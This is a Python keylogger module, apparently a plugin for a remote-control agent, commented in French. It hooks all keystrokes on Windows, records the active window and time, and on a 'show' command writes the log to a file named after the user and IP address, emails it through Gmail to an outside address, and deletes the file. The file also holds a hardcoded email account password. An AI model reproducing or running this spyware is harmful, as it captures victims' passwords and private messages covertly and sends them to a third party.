# -*- coding: cp1252 -*-
import requests
import time
from threading import Thread
import pythoncom
import pyHook
import smtplib
import socket
import os
from os.path import basename
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate

import utils


started = False
started_temp = False
keylog = ""
current_window = ""
ID_key = {9:"\t", 13:"\n", 32:" ", 48:"à", 49:"&", 50:"é", 51:'"', 52:"'", 53:"(", 54:"-", 55:"è", 56:"_", 57:"ç",
          65:"a", 66:"b", 67:"c", 68:"d", 69:"e", 70:"f", 71:"g", 72:"h", 73:"i", 74:"j", 75:"k", 76:"l", 77:"m",
          78:"n", 79:"o", 80:"p", 81:"q", 82:"r", 83:"s", 84:"t", 85:"u", 86:"v", 87:"w", 88:"x", 89:"y", 90:"z",
          96:"0", 97:"1", 98:"2", 99:"3", 100:"4", 101:"5", 102:"6", 103:"7", 104:"8", 105:"9", 106:"*", 107:"+",
          109:"-", 110:".", 111:"/", 186:"$", 187:"=", 188:",", 190:";", 191:":", 192:"ù", 219:")", 223:"!",
          226:"<"}


#Fonction permettant d'envoyer un mail contenant le fichier du keylogger
def send_email(send_from, pwd, send_to, subject, text, files = None):
    msg = MIMEMultipart()
    msg['From'] = send_from
    msg['To'] = send_to
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = subject
    msg.attach(MIMEText(text))
    for f in files or []:
        with open(f, "rb") as fil:
            part = MIMEApplication(
                fil.read(),
                Name=basename(f)
            )
            part['Content-Disposition'] = 'attachment; filename="%s"' % basename(f)
            msg.attach(part)
    try:
        server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        server.ehlo()
        #server.starttls()
        server.login(send_from, pwd)
        server.sendmail(send_from, send_to, msg.as_string())
        server.close()
        utils.send_output("File send successfully !")
    except:
        utils.send_output("Error while sending the file !")


#Fonction permettant de récupérer l'événement clavier et de l'interpréter
def OnKeyboardEvent(event):
    global current_window
    global keylog
    global started_temp
    if started_temp == True:
        if current_window != event.WindowName:
            current_window = event.WindowName
            keylog += "\n\n[%s] @ %s\n" % (current_window, time.ctime())
        if event.KeyID == 8:
            keylog = keylog[0:-1]
        elif event.KeyID in ID_key:
            keylog += ID_key[event.KeyID]
        #print keylog
    return True


#Fonction permettant de créer un objet pyHook afin de pouvoir l'utiliser pour capturer les touches du clavier
def keylogger():
    #Création d'un nouveau gestionnaire permettant de capturer les touches
    hm=pyHook.HookManager()
    #Surveille les événements clavier. Lorsqu'une touche pressé est détectée, on appelle la fonction 'OnKeyboardEvent'
    hm.KeyDown=OnKeyboardEvent
    hm.HookKeyboard()
    #On utilise pythoncom afin de pouvoir recevoir les notifications d'événements de saisie
    pythoncom.PumpMessages()


#Lancement du module à partir de l'agent
def run(action):
    global started
    global started_temp
    global keylog
    global current_window
    if action == "start":
        if started == False and started_temp == False:
            #On démarre le module avec un Thread pour ne pas bloquer l'agent et pouvoir l'utiliser pour d'autres modules
            myThread = Thread(target=keylogger)
            myThread.setDaemon(True)
            myThread.start()
            started = True
            started_temp = True
            utils.send_output("Keylogger started")
        elif started == True and started_temp == False:
            started_temp = True
            utils.send_output("Keylogger started")
        else:
            utils.send_output("Keylogger already running")
            
    elif action == "show":
        ###utils.send_output(keylog)
        #On enregistre la variable keylog dans un fichier avant d'effacer cette dernière
        name = "" + os.getenv("username") + "_" + socket.gethostbyname(socket.gethostname())
        filename = name + ".txt"
        outputFile = open(filename, "w")
        outputFile.write(keylog)
        outputFile.close()
        keylog = ""
        current_window = ""
        #On envoie le fichier par mail et on le supprime
        send_email('alertInfoESGI@gmail.com', 'PuG#GeLk!3552;', 'alertInfoESGI@gmail.com', "NEW KeyL EMAIL : " + name, "Here the last file of the host : " + name, [filename])
        os.remove(filename)
        
    elif action == "stop":
        if started_temp == False:
            utils.send_output("Keylogger already stopping")
        else:
            started_temp = False
            keylog = ""
            current_window = ""
            utils.send_output("Keylogger stopped")
        
    else:
        utils.send_output("Usage: keylogger start|show|stop")


#Fonction permettant d'afficher l'aide
def help():
    help_text = """
Usage: keylogger start|show|stop
Starts a keylogger, shows logged by sending an e-mail and stops the keylogger.

"""
    return help_text
